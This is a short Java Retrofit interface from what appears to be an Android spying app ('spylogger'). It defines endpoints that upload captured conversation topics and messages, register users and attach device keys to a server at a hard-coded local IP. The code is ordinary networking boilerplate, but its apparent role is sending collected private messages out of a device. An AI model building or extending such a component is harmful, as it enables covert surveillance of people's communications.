package com.gravatasufoca.spylogger.services;

import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.vos.RespostaRecebimentoVO;
import com.gravatasufoca.spylogger.vos.UsuarioVO;

import java.util.List;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.POST;
import retrofit2.http.Path;

/**
 * Created by bruno on 01/12/16.
 */

public interface SendDataInterface {

//    String ip="172.24.35.147";
    String ip="192.168.1.119";

    String apiUrl="http://"+ip+"/smartlog/api/v1/";

    @POST(apiUrl+"receber/topicos")
    Call<RespostaRecebimentoVO> enviarTopicos(@Body List<Topico> topicos);

    @POST(apiUrl+"receber/mensagens")
    Call<RespostaRecebimentoVO> enviarMensagens(@Body List<Mensagem> mensagens);

    @POST(apiUrl+"usuario")
    Call<UsuarioVO> inserirUsuario(@Body UsuarioVO usuarioVO);

    @POST(apiUrl+"usuario/perfil/{id}/{chave}")
    Call<UsuarioVO> inserirChave(@Path("id") Integer idAparelho, @Path("chave") String chave);

}
